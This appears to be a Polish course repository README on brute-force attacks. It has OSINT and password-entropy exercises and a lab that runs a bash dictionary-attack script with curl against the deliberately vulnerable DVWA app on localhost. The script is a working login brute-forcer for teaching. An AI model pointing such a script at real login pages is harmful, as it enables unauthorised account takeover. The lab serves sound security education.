# Prezerntacja---Atak-brute-force
Rezpozytorium stworzone na potrzeby zajęć BAIiM

## Zadania
### ZAD 1 Audyt Osobisty i OSINT

1.	Narzędzie: Odwiedź stronę haveibeenpwned.com (HIBP).
2.	Działanie: Wpisz swój stary adres e-mail (np. z czasów szkolnych).
3.	Analiza: Sprawdź, w jakich wyciekach figuruje (np. "Collection #1", "Morele", "LinkedIn").
4.	Refleksja: Zobacz, jakie dane wyciekły (Hasła? Daty urodzenia?). Zastanów się, czy używałeś tego samego hasła w innych miejscach.

### ZAD 2 Pomysł na biznes

Cel: Oblicz, ile lat zajęłoby superkomputerowi Athena (AGH) włamanie się do dowolnego z istniejących portfeli z 12-wyrazową frazą seed.
Dane do obliczeń:
 - Wszystkie kombinacje (12 słów): ok. $3,4 \times 10^{38}$ (dla standardu BIP-39 który zakłada 2048 słów)
 - Liczba aktywnych portfeli do trafienia: $100\ 000\ 000$ ($10^8$)
 - Moc obliczeniowa Atheny: $100$ miliardów prób/sekundę ($10^{11}$)
 - Rok: ok. $31,5$ mln sekund

Pytanie: Ile lat trwałoby sprawdzanie fraz, aż statystycznie trafimy na jeden z aktywnych portfeli?

### ZAD 3 Warto wiedzieć

Cel: Oblicz liczbę możliwych kombinacji dla tradycyjnego hasła o długości 12 znaków w czterech wariantach i porównaj wynik z bezpieczeństwem portfela krypto ($2^{128}$).
Dane do obliczeń (liczba znaków w zbiorach):
- Małe litery (a-z): 26
- Duże litery (A-Z): 26
- Cyfry (0-9): 10
- Znaki specjalne (np. !@#$%...): 32
- Wzór: Liczba kombinacji = $S^L$ ($S$ – wielkość zbioru znaków, $L$ – długość hasła, czyli 12).

Oblicz liczbę kombinacji dla hasła 12-znakowego, gdy używamy:
- Tylko małych liter.
- Małych liter + znaków specjalnych.
- Małych i dużych liter + znaków specjalnych.
- Małych i dużych liter + znaków specjalnych + cyfr.

Pytanie dodatkowe: O ile rzędów wielkości najsilniejsze hasło (wariant 4) jest słabsze od frazy seed ($3,4 \times 10^{38}$)?

### ZAD 4 Prosty atak brute force
W poniższym zadaniu użyjemy ataku brute force na aplikacje dvwa

Uruchom aplikacje
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
Wejdź na adres localhost
Zaloguj się admin password
Kliknij setup -> reset database
Zaloguj się admin password
Przejdź do zakładki brute force lub pod link http://localhost/vulnerabilities/brute/
Spróbuj się zalogować
---
Utworz prosty plik txt
```
echo "password" >> pass.txt
echo "1234" >> pass.txt
echo "67pass" >> pass.txt
echo "gsfAdz" > pass.txt
```

Napisz skrypt który będzie atakował bruteforcem link http://localhost/vulnerabilities/brute/

Lub użyj gotowego
```
nano script.sh
```
Wklej poniższy kod
```
#!/bin/bash

URL="http://localhost/vulnerabilities/brute/"
COOKIE="security=low; PHPSESSID=<TWOJE_CIASTECZKO>"
USERNAME="admin"
PASSFILE="pass.txt"

while read password; do
    response=$(curl -s -b "$COOKIE" "$URL?username=$USERNAME&password=$password&Login=Login")
    if echo "$response" | grep -q "incorrect"; then
        echo "[-] FAILED: $USERNAME:$password"
    else
        echo "[+] FOUND: $USERNAME:$password"
    fi
done < "$PASSFILE"
```
URL - link to formularza z loginem
COOKIE - Pozyskaj je wchodząc do konsoli i kopiują wartość z PHPSESSID np.
```
COOKIE="security=low; PHPSESSID=uajef67tv5p9173593cdtp9id6"
```
USERNAME - nazwa użytkownika którego łamiemy
PASSFILE - plik ze słownikiem haseł

Uruchom skrypt
```
chmod +x script.sh
./script.sh
```


